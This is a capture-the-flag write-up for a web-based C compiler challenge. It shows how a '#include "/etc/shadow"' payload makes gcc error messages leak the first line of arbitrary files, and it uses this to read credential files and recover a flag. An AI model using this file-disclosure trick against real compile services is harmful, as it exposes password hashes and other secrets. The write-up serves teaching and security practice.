# free-c-compiler writeup

We get access to a webpage containing a single textbox and a compile button.

## Reconnaissance

To start exploring, we try to get it to do something. We try submitting without filling anything in in the form.

The page responds with an error message:

```
/usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-gnu/Scrt1.o: In function `_start':
(.text+0x20): undefined reference to `main'
collect2: error: ld returned 1 exit status
```

This looks an awful lot like the error output of `gcc`, the GNU C Compiler.


Next up, we try typing in some random garbage, and we get an error again:

```
/tmp/cc752754060/main.c:1:1: error: unknown type name ‘sfoiniosfnoos’
 sfoiniosfnoos
 ^~~~~~~~~~~~~
/tmp/cc752754060/main.c:2:1: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ at end of input
 spfneo
 ^~~~~~
```

It looks like the code we submit is placed in a `main.c` file in some temporary folder.

Let's try putting in a valid program, and see if it gets executed. I am very lazy, so I search online for a simple hello world program in C.

```c
#include<stdio.h>

int main(void) {
    printf("Hello World\n");
    return 0;
}
```

Unfortunately, it does not look like the program actually gets executed. We now do not get any error output, but a link to click to download the compilation output. The link goes to `/download.php?id=1383788887`. Since the id is probably used in a path to locate your compile results, you could have tried some path traversal attacks. These attempts will lead nowhere because the parameter is always casted to an integer.

## Constructing an exploit

We return to refocus on the input textarea.
You might have noticed the `#include` instruction in the previous hello world program. An internet search for this directive leads us to [the gnu documentation](https://gcc.gnu.org/onlinedocs/cpp/Include-Syntax.html)

The documentation learns us that there are 2 variants, `#include <filename>` and `#include "filename`. The first variant will look in a list of standard system directories, but the second variant will allow us to include an arbitrary file.

Let's experiment a bit, and try to include a file we know we created previously.

```c
#include "/tmp/cc752754060/main.c"
```

As expected, we get an error back:

```
In file included from /tmp/cc538047313/main.c:1:0:
/tmp/cc752754060/main.c:1:1: error: unknown type name ‘sfoiniosfnoos’
 sfoiniosfnoos
 ^~~~~~~~~~~~~
/tmp/cc538047313/main.c:1:0: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ at end of input
 #include "/tmp/cc752754060/main.c"
```

But, we notice that the error message includes text that is present in the file that we just included.
We can use the `#include` directive to read the first line of arbitrary files.

We can only read files, we can't list the contents of directories.
So we have to make an accurate guess as to which file will contain the passwords we want to steal.

On a modern linux system, passwords are stored in `/etc/shadow`.
Under normal circumstances, this file is only readable for `root`, but it's worth it to give it a shot anyways.

## Exploit

We try to include `/etc/shadow`

```c
#include "/etc/shadow"
```

`/etc/shadow` is not a valid C header file, so the compiler spits out some error messages.
Of course, these error messages include the line that caused the error.

```
In file included from /tmp/cc1401467993/main.c:1:0:
/etc/shadow:1:5: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘:’ token
 root:FLG{8485fd422ec48dbbdc446e68376189e0750650d1b94a}:17847:0:99999:7:::
     ^
/etc/shadow:1:10: error: invalid suffix "fd422ec48dbbdc446e68376189e0750650d1b94a" on integer constant
 root:FLG{8485fd422ec48dbbdc446e68376189e0750650d1b94a}:17847:0:99999:7:::
          ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/etc/shadow:1:55: error: expected identifier or ‘(’ before ‘:’ token
 root:FLG{8485fd422ec48dbbdc446e68376189e0750650d1b94a}:17847:0:99999:7:::
                                                       ^
```

It seems like we found our flag in the password field of the `root` account.

## Background information

In a normal system, `/etc/shadow` is only readable by the `root` account, and it contains hashed passwords instead of flags.

The last line of the assignment reads:

> Let's start by stealing some passwords to hack ourselves into the mainframe.

This should have hinted you to start looking at the `/etc/passwd` or the `/etc/shadow` files once you figured out that you can include arbitrary files.

Both files contain the flag, and to make the challenge slightly easier, we made `/etc/shadow` world-readable.
